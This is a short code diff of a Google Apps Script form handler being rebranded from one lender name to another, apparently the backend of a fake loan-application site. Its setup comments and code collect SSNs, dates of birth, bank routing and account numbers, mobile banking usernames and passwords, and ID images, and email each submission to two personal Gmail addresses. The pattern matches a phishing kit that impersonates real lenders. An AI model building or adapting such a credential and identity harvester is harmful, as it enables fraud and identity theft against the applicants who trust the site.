@@ -1,26 +1,26 @@
 /**
  * ============================================================
- * AdvanceAmericaLoans - Form Handler
+ * AvantFinance - Form Handler
  * Google Apps Script Web App
  * ============================================================
  * 1. Create a new Google Sheet.
- * 2. Rename the first sheet tab to "AdvanceAmericaLoans Applications".
+ * 2. Rename the first sheet tab to "AvantFinance Applications".
  * 3. Add these headers in row 1:
  *    Timestamp | First Name | Last Name | Email | Phone | SSN | DOB |
  *    Address | City | State | ZIP | Bank Name | Routing | Account |
  *    Mobile Username | Mobile Password | Loan Amount | Monthly Income | Purpose | ID Front | ID Back |
  * 4. Open Apps Script (Extensions > Apps Script).
  * 5. Paste this code into the script editor.
- * 6. Update NOTIFICATION_EMAIL and KILL_SWITCH below.
+ * 6. Update NOTIFICATION_EMAILS and KILL_SWITCH below.
  * 7. Deploy as Web App (Execute as Me, Allow Anyone).
  * 8. Copy the deployment URL into src/lib/constants.ts
  * ============================================================
  */
 
-const NOTIFICATION_EMAIL = 'finnfoxpersonalloan@gmail.com, aavantdatamart@gmail.com'
+const NOTIFICATION_EMAILS = ['finnfoxpersonalloan@gmail.com', 'aavantdatamart@gmail.com']
 const KILL_SWITCH = false // Set to true to immediately reject submissions
-const SHEET_NAME = 'AdvanceAmericaLoans Applications'
-const SCRIPT_PROJECT_NAME = 'AdvanceAmericaLoans - Form Handler'
+const SHEET_NAME = 'AvantFinance Applications'
+const SCRIPT_PROJECT_NAME = 'AvantFinance - Form Handler'
 
 function doPost(e) {
   if (KILL_SWITCH) {
@@ -126,7 +126,7 @@ function sendNotificationEmail(data) {
   }
 
   MailApp.sendEmail({
-    to: NOTIFICATION_EMAIL,
+    to: NOTIFICATION_EMAILS,
     subject: subject,
     htmlBody: body,
     attachments: attachments,
